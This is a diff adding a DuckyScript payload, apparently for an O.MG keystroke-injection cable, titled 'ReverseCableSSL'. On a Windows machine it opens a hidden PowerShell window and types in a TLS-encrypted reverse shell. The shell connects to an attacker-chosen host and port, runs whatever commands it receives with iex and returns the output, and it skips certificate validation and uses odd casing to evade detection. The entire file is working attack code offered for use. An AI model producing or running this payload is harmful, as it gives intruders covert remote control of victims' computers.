@@ -1,0 +1,43 @@
+REM       ReverseCableSSL
+REM       Version 2.0
+REM       OS: Windows
+REM       Author: 0iphor13
+REM       Requirements: OMG Firmware v.3.0 or higher
+
+REM       Getting encrypted remote access via powershell
+
+REM Define your receiving Host below
+DEFINE #ADDRESS '0.0.0.0'
+DEFINE #PORT 4444
+
+FUNCTION Detect_Finished()
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+DELAY 100
+CAPSLOCK
+END_FUNCTION
+
+DELAY 500
+REM Define your language below
+DUCKY_LANG de
+DELAY 1500
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -W H
+DELAY 1000
+STRING $01=[Text.Encoding]::ASCII.GetBytes("`n[+] Connection received - O.MG@$env:USERNAME/$env:COMPUTERNAME `n`n");
+DEFINE #VAR #DfdGgfdbOMG
+STRING $c=new-OBJecT Net.Sockets.TcpClient(#ADDRESS,#PORT);
+STRING $s=$c.GetStream();
+DEFINE #DfdGgfdbOMG NeW-oBjECt
+STRING $sSL=#DfdGgfdbOMG System.Net.Security.SslStream($s,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
+STRING $sSL.AuthenticateAsClient('01phOri3.omg', $null, "Tls12", $false);
+STRING $w=#VAR System.IO.StreamWriter($sSL);$sSL.write($01,0,$01.Length);$w.Write('OMG@PS ' + (pwd).Path + '> ');$w.flush();[byte[]]$b = 0..65535|%{0};while(($i=$sSL.Read($b, 0, $b.Length)) -ne 0)
+STRING {$D=(#DfdGgfdbOMG -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$Y=(iex $D | Out-String ) 2>&1;
+STRING $X=$Y + 'OMG@PS ' + (Get-LoCatIon).Path + '> ';
+STRINGLN $Z=([text.encoding]::ASCII).GetBytes($X);$sSL.Write($Z,0,$Z.Length);$sSL.Flush()};exIT
+DELAY 100
+Detect_Finished()
